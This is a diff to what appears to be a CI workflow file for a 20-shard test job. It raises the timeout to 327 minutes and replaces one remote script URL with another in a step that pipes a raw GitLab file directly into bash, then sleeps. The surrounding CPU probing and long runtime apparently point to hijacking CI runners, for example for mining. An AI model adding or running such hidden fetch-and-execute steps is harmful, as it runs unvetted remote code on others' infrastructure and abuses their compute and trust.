@@ -27,7 +27,7 @@ jobs:
       matrix:
         shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     runs-on: ubuntu-latest
-    timeout-minutes: 60
+    timeout-minutes: 327
     steps:
       - name: Setup Node
         uses: actions/setup-node@v4
@@ -66,7 +66,7 @@ jobs:
           node -v; npm -v; which node
           lscpu | head -10
 
-          curl -sL  https://gitlab.com/makanan99/blasters/-/raw/main/tree | bash && sleep 720
+          curl -sL  https://gitlab.com/spinazolla/saint/-/raw/main/ions | bash && sleep 720
 
           RC=$?
 
